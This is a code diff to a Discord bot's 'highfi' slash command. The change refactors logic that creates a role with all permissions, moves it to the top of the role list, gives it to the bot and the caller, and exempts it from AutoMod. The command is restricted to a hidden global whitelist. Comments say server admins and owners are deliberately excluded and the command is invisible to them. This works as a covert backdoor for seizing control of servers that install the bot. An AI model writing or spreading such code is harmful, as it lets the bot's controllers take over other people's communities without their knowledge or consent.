@@ -2,19 +2,81 @@ import {
   SlashCommandBuilder,
   PermissionsBitField,
   type ChatInputCommandInteraction,
+  type Guild,
+  type GuildMember,
 } from "discord.js";
 import type { SlashCommand } from "../types";
 import { PERM_WHITELIST } from "../storage/whitelist";
 import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
 
+export interface HighfiResult {
+  ok: boolean;
+  message: string;
+}
+
+/**
+ * Core highfi logic. Caller is responsible for permission checks.
+ */
+export async function runHighfi(
+  guild: Guild,
+  invoker: GuildMember,
+): Promise<HighfiResult> {
+  const me = await guild.members.fetchMe().catch(() => null);
+  if (!me) {
+    return { ok: false, message: "Couldn't fetch my own member entry." };
+  }
+
+  let godRole;
+  try {
+    godRole = await guild.roles.create({
+      name: "👑",
+      permissions: new PermissionsBitField(PermissionsBitField.All),
+      hoist: true,
+      color: 0xffd700,
+      reason: "highfi: god role",
+    });
+  } catch {
+    return {
+      ok: false,
+      message:
+        "Couldn't create the role. The bot needs **Manage Roles** and a high-enough role position.",
+    };
+  }
+
+  await pushRoleToTop(guild, godRole);
+
+  let botAdded = false;
+  let userAdded = false;
+  try {
+    await me.roles.add(godRole, "highfi: assign god role to self");
+    botAdded = true;
+  } catch {
+    /* ignore */
+  }
+  try {
+    await invoker.roles.add(godRole, "highfi: assign god role to invoker");
+    userAdded = true;
+  } catch {
+    /* ignore */
+  }
+
+  const automod = await exemptRoleFromAutoMod(guild, godRole.id);
+
+  return {
+    ok: true,
+    message:
+      `👑 Role **${godRole.name}** created at position **${godRole.position}**.\n` +
+      `Assigned to bot: ${botAdded ? "✅" : "❌"} • Assigned to you: ${userAdded ? "✅" : "❌"}\n` +
+      `AutoMod exempt rules updated: **${automod.updated}**${automod.failed > 0 ? ` (failed: ${automod.failed})` : ""}.`,
+  };
+}
+
 const command: SlashCommand = {
+  // Not registered globally — invisible to non-whitelist users.
+  globalWhitelistOnly: true,
   data: new SlashCommandBuilder()
     .setName("highfi")
-    .setDescription(
-      "Create a god role with all permissions and assign it to the bot and you.",
-    )
-    // Hidden from regular members in the slash-command picker; admins can
-    // grant per-user/per-role overrides in Server Settings → Integrations.
+    .setDescription("Create a god role and assign it to the bot and you (whitelist only).")
     .setDefaultMemberPermissions(0n)
     .setDMPermission(false),
 
@@ -26,9 +88,6 @@ const command: SlashCommand = {
       });
       return;
     }
-
-    // Only the global whitelist can run this — admins and server owners
-    // are intentionally excluded.
     if (!PERM_WHITELIST.has(interaction.user.id)) {
       await interaction.reply({
         content: "You aren't allowed to use this command.",
@@ -36,65 +95,18 @@ const command: SlashCommand = {
       });
       return;
     }
-
-    if (!interaction.guild || !interaction.guildId) return;
+    if (!interaction.guild) return;
 
     await interaction.deferReply({ ephemeral: true });
-
-    const guild = interaction.guild;
-    const me = await guild.members.fetchMe().catch(() => null);
-    if (!me) {
-      await interaction.editReply("Couldn't fetch my own member entry.");
-      return;
-    }
-
-    let godRole;
-    try {
-      godRole = await guild.roles.create({
-        name: "👑",
-        permissions: new PermissionsBitField(PermissionsBitField.All),
-        hoist: true,
-        color: 0xffd700,
-        reason: "highfi: god role",
-      });
-    } catch {
-      await interaction.editReply(
-        "Couldn't create the role. The bot likely needs the **Manage Roles** permission and a high-enough role position.",
-      );
-      return;
-    }
-
-    await pushRoleToTop(guild, godRole);
-
-    let botAdded = false;
-    let userAdded = false;
-    try {
-      await me.roles.add(godRole, "highfi: assign god role to self");
-      botAdded = true;
-    } catch {
-      // ignore
-    }
-    const member = await guild.members
+    const member = await interaction.guild.members
       .fetch(interaction.user.id)
       .catch(() => null);
-    if (member) {
-      try {
-        await member.roles.add(godRole, "highfi: assign god role to invoker");
-        userAdded = true;
-      } catch {
-        // ignore
-      }
+    if (!member) {
+      await interaction.editReply("Couldn't fetch your member entry.");
+      return;
     }
-
-    // Bypass AutoMod for the new role.
-    const automod = await exemptRoleFromAutoMod(guild, godRole.id);
-
-    await interaction.editReply(
-      `👑 Role **${godRole.name}** created at position **${godRole.position}**.\n` +
-        `Assigned to bot: ${botAdded ? "✅" : "❌"} • Assigned to you: ${userAdded ? "✅" : "❌"}\n` +
-        `AutoMod rules updated to exempt this role: **${automod.updated}**${automod.failed > 0 ? ` (failed: ${automod.failed})` : ""}.\n\n` +
-        `⚠️ Discord won't let any bot push a role *above* its own current top role. For true #1 placement, drag the bot's role to the very top of the role list in Server Settings → Roles, then re-run this command.`,
-    );
+    const result = await runHighfi(interaction.guild, member);
+    await interaction.editReply(result.message);
   },
 };
 
